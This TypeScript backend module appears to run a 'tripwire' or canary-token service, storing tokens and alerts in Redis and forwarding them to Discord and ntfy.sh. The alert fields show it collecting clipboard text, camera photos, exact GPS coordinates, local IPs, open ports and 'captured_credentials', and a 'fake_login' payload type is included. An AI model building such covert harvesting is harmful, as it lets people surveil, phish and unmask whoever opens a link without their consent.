import Redis from 'ioredis';
import crypto from 'crypto';

let redisInstance: Redis | null = null;

export function getRedis(): Redis | null {
  if (redisInstance) return redisInstance;
  
  const redisUrl = process.env.REDIS_URL || process.env.KV_URL || '';
  
  if (!redisUrl) {
    console.error('Missing REDIS_URL environment variable.');
    return null;
  }
  
  try {
    redisInstance = new Redis(redisUrl);
    return redisInstance;
  } catch (e) {
    console.error('Failed to initialize Redis client:', e);
    return null;
  }
}

export type Token = { id: string; user_id: string; token_name: string; memo: string; redirect_url: string; payload_type?: 'invisible' | 'redirect' | 'fake_login'; created_at: string };
export type Alert = { 
  id: string; 
  token_id: string; 
  attacker_ip: string; 
  user_agent: string; 
  location: string; 
  triggered_at: string; 
  token_name?: string; 
  memo?: string;
  hardware_concurrency?: number;
  device_memory?: number;
  screen_resolution?: string;
  timezone?: string;
  language?: string;
  device_model?: string;
  os_platform?: string;
  gpu_renderer?: string;
  battery_level?: string;
  connection_type?: string;
  touch_points?: number;
  exact_lat?: number;
  exact_lon?: number;
  local_ip?: string;
  threat_id?: string;
  captured_credentials?: string;
  color_depth?: number;
  dark_mode?: boolean;
  referrer?: string;
  clipboard_text?: string;
  dwell_time_ms?: number;
  camera_image?: string;
  device_posture?: string;
  open_ports?: string[];
  has_adblocker?: boolean;
  behavioral_data?: any;
  hacker_extensions?: string[];
  developer_fonts?: string[];
  local_router_ip?: string;
  is_sandbox_bot?: boolean;
  peripheral_count?: any;
  network_speed?: any;
  installed_apps?: string[];
  accessibility_settings?: string[];
  cpu_benchmark_score?: number;
  estimated_storage_gb?: number;
  vpn_mismatch?: boolean;
  webgl_fingerprint?: string;
};

export async function getToken(id: string): Promise<Token | null> {
  const redis = getRedis();
  if (!redis) return null;
  
  try {
    const data = await redis.get(`token:${id}`);
    return data ? JSON.parse(data) : null;
  } catch (err) {
    console.error('Redis get token error:', err);
    return null;
  }
}

export async function getAlerts(user_id: string): Promise<Alert[]> {
  const redis = getRedis();
  if (!redis) return [];
  
  try {
    const alertsData = await redis.lrange(`alerts:${user_id}`, 0, 50);
    return alertsData.map(a => JSON.parse(a));
  } catch (err) {
    console.error('Redis get alerts error:', err);
    return [];
  }
}

export async function createToken(user_id: string, token_name: string, memo: string, redirect_url: string = '', payload_type: 'invisible' | 'redirect' | 'fake_login' = 'invisible'): Promise<Token> {
  const id = crypto.randomUUID();
  const newToken: Token = { id, user_id, token_name, memo, redirect_url, payload_type, created_at: new Date().toISOString() };
  
  const redis = getRedis();
  if (!redis) return newToken; 
  
  try {
    await redis.set(`token:${id}`, JSON.stringify(newToken));
    await redis.set(`token_lookup:${id}`, user_id);
    await redis.lpush(`tokens:${user_id}`, JSON.stringify(newToken));
  } catch (err) {
    console.error('Redis create token error:', err);
  }
  
  return newToken;
}

async function sendNtfyNotification(alert: Alert, userId: string, isTelemetry: boolean = false) {
  const redis = getRedis();
  if (!redis) return;
  
  try {
    const settingsStr = await redis.get(`settings:${userId}`);
    if (!settingsStr) return;
    const settings = JSON.parse(settingsStr);
    if (!settings.ntfy_topic) return;

    const title = isTelemetry ? "Advanced Telemetry Recovered" : "Tripwire Triggered!";
    let body = `🚨 Tripwire: ${alert.token_name || "Unknown"}
📍 IP: ${alert.attacker_ip}
🌍 Location: ${alert.location || "Unknown"}
💻 Device: ${alert.device_model || alert.os_platform || "Unknown"}
⏱️ Time: ${new Date(alert.triggered_at).toLocaleString()}`;

    if (alert.gpu_renderer) body += `\n🎮 GPU: ${alert.gpu_renderer}`;
    if (alert.battery_level) body += `\n🔋 Battery: ${alert.battery_level}`;
    if (alert.open_ports && alert.open_ports.length > 0) body += `\n🚪 Open Ports: ${alert.open_ports.join(', ')}`;
    if (alert.clipboard_text) body += `\n📋 Clipboard: ${alert.clipboard_text.substring(0, 100)}`;
    if (alert.camera_image) body += `\n📸 Camera: Photo Captured!`;
    if (alert.network_speed && alert.network_speed.downlink_mbps) body += `\n⚡ Network: ${alert.network_speed.downlink_mbps} Mbps`;
    if (alert.threat_id) body += `\n🕵️ Threat ID: ${alert.threat_id}`;

    await fetch(`https://ntfy.sh/${settings.ntfy_topic}`, {
      method: 'POST',
      body: body,
      headers: {
        'Title': title,
        'Tags': isTelemetry ? 'microscope' : 'warning',
        'Priority': isTelemetry ? '3' : '4'
      }
    });
  } catch (err) {
    console.error('Ntfy notification failed:', err);
  }
}

async function sendDiscordWebhook(alert: Alert, user_id: string, isTelemetry: boolean = false) {
  let webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  const redis = getRedis();
  if (redis) {
    try {
      const settingsStr = await redis.get(`settings:${user_id}`);
      if (settingsStr) {
        const settings = JSON.parse(settingsStr);
        if (settings.discord_webhook) webhookUrl = settings.discord_webhook;
      }
    } catch(e) {}
  }
  
  if (!webhookUrl) return;

  const fields = [
    { name: "Token Name", value: alert.token_name || "Unknown", inline: true },
    { name: "Threat ID", value: alert.threat_id || (isTelemetry ? "Unknown" : "Pending..."), inline: true },
    { name: "IP Address", value: alert.attacker_ip || "Unknown", inline: true },
    { name: "Location", value: alert.location || "Unknown", inline: true },
    { name: "Device OS", value: alert.os_platform || "Unknown", inline: true },
    { name: "Target Context", value: alert.memo || "None", inline: false }
  ];

  if (isTelemetry) {
    if (alert.gpu_renderer) fields.push({ name: "GPU Renderer", value: alert.gpu_renderer, inline: true });
    if (alert.battery_level) fields.push({ name: "Battery", value: alert.battery_level, inline: true });
    if (alert.open_ports && alert.open_ports.length > 0) fields.push({ name: "Open Ports", value: alert.open_ports.join(', '), inline: false });
    if (alert.clipboard_text) fields.push({ name: "Clipboard", value: alert.clipboard_text.substring(0, 1000), inline: false });
    if (alert.camera_image) fields.push({ name: "Camera", value: "Photo Captured (Check Dashboard)", inline: true });
  }

  const embed = {
    title: isTelemetry ? "🚨 Advanced Telemetry Recovered" : "🚨 Tripwire Triggered!",
    color: isTelemetry ? 0x9c27b0 : 0xff0000,
    fields: fields,
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch(e) {
    console.error('Discord webhook failed');
  }
}

export async function createAlert(token_id: string, attacker_ip: string, user_agent: string, location: string = 'Unknown Location'): Promise<Alert> {
  const id = crypto.randomUUID();
  const newAlert: Alert = { id, token_id, attacker_ip, user_agent, location, triggered_at: new Date().toISOString() };
  
  const redis = getRedis();
  if (!redis) return newAlert;
  
  try {
    const tokenStr = await redis.get(`token:${token_id}`);
    if (tokenStr) {
      const token: Token = JSON.parse(tokenStr);
      const user_id = token.user_id;
      newAlert.token_name = token.token_name;
      newAlert.memo = token.memo;
      await redis.lpush(`alerts:${user_id}`, JSON.stringify(newAlert));
      await redis.set(`alert_lookup:${id}`, user_id);
      
      await redis.ltrim(`alerts:${user_id}`, 0, 49);
      
      // Fire initial webhooks
      await sendDiscordWebhook(newAlert, user_id, false);
      await sendNtfyNotification(newAlert, user_id, false);
    }
  } catch (err) {
    console.error('Redis create alert error:', err);
  }
  
  return newAlert;
}

export async function updateAlertDetails(alert_id: string, details: Partial<Alert>): Promise<void> {
  const redis = getRedis();
  if (!redis) return;

  try {
    const user_id = await redis.get(`alert_lookup:${alert_id}`);
    if (!user_id) return;

    const script = `
      local user_id = redis.call("GET", "alert_lookup:" .. KEYS[1])
      if not user_id then return nil end
      local alerts = redis.call("LRANGE", "alerts:" .. user_id, 0, 50)
      for i, alert_str in ipairs(alerts) do
        local alert = cjson.decode(alert_str)
        if alert.id == KEYS[1] then
          local details = cjson.decode(ARGV[1])
          for k, v in pairs(details) do
            alert[k] = v
          end
          local updated_str = cjson.encode(alert)
          redis.call("LSET", "alerts:" .. user_id, i - 1, updated_str)
          return updated_str
        end
      end
      return nil
    `;

    const result = await redis.eval(script, 1, alert_id, JSON.stringify(details));

    if (result && typeof result === 'string') {
      const updatedAlert = JSON.parse(result);
      // Fire secondary telemetry webhooks
      await sendDiscordWebhook(updatedAlert, user_id, true);
      await sendNtfyNotification(updatedAlert, user_id, true);
    }
  } catch (err) {
    console.error('Redis update alert error:', err);
  }
}
